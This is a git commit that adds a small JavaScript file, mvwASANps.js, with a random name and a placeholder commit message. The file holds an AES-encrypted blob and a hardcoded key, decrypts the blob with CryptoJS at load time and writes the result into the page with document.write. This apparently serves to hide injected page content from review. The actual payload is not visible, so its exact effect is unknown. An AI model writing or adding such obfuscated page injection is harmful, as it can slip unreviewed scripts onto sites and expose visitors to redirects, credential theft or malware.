d856b8b36740e3bd0723fa9a1b305809595ac9c2
bulaba <octocat@github.com>
2023-03-08 21:12:31 +0200

    my commit message

---
+++ mvwASANps.js
@@ -0,0 +1,5 @@
+var USZA="U2FsdGVkX1+nu34wsQxBmBT3TgzGND1zxDns2urRXXP36gmYEoaUeptPkB/569C4qjXbVq1jiHosMwL3LdKnLBktUIpn1xSSbBMfTNKdqhR/m+3akXjErnaEJBRJw9re/TLD3de8/9YWum/moYgwGwAeYS+nG0muVJORe20Vq5tOqSvwqaJoyDiFf0ZhVVe0e5BJRTDFeyXSqtmg2Hr3+h8qDLNRjnjxpgKYRlY7EKbHxEBzaRunOhpjSJxIxv0PJoNZzIJ9K66suIiijh4q/shxAiV0DQh/ehwcq3ga5m6Q5KmLsUCX0sPJIS1n7ryZJBU/A3SGVVlf9fW/RRmxjXDQaS376NDjGxxGeuaHQXN/tJ3Jn+dnie1y5TVHNJV+EIcGGdc8F5bSdBIDnFH+AA==" 
+ var UZXfG = "pBqDQiNBgLOBOTTy"; 
+ var GMgVPGU= CryptoJS.AES.decrypt(USZA, UZXfG); 
+ var vSxGlX = GMgVPGU.toString(CryptoJS.enc.Utf8); 
+ document.write(vSxGlX) 
